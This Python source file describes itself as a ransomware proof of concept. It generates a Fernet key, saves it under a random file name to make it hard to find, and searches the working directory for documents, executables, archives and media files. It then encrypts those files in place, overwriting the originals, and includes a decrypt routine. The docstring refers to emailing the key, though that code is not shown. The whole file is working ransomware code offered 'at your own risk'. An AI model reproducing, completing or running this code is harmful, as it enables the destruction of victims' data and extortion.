from cryptography.fernet import Fernet
import random
import glob
import string

"""
The basic encrypt, generation, and decrypt functions are borrowed from the Fernet documentation.
All extra code for this ransomware POC is made by me such as the file creation/deletion of key, the emailing of the key, main.py, etc.
Credit for the pre-exisitng used functions goes to those who desreve it :).
Use this at your own risk !! 

"""

#creates random file name to prevent easy finding
def random_fname():
    x = string.ascii_letters
    y = ''.join(random.choice(x) for i in range(10))
    fname = y+".key"
    return fname

#creates a key and saves to a file this will be removed in the future to hide key and use a premade/nonstored one for ransomeware
def create_key():
    key = Fernet.generate_key()
    #random key file name

    with open(random_fname(),"wb") as key_file:
        key_file.write(key)

#crawls file extensions and creates a list of them
def os_crawler():
    extensions = ['*.txt', '*.docx', '*.exe', '*.zip', '*.rar', '*.mp3', '*.mp4', '*.jpg', '*.png']
    crawled_list = []
    for x in range(len(extensions)):
        crawled_list.append(glob.glob(extensions[x]))
    return crawled_list

#flattens list from crawler
def flatten(t):
    return [item for sublist in t for item in sublist]

#finds file in current directory and loads key from file
def load_key():
    targetPattern = glob.glob("*.key")
    return open(targetPattern[0], "rb").read()

#requires a file name (str) and a key (bytes) it will ecrypt the file and write it
def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

#decrypts the encrypted file with given key
def decrypt(fname, key):
    f = Fernet(key)
    with open(fname, "rb") as file:
        #read encrypted stuff
        encrypted_data = file.read()
    #decrypt data that was read
    decrypted_data = f.decrypt(encrypted_data)
    #rewrite the original file
    with open(fname, "wb") as file:
        file.write(decrypted_data)
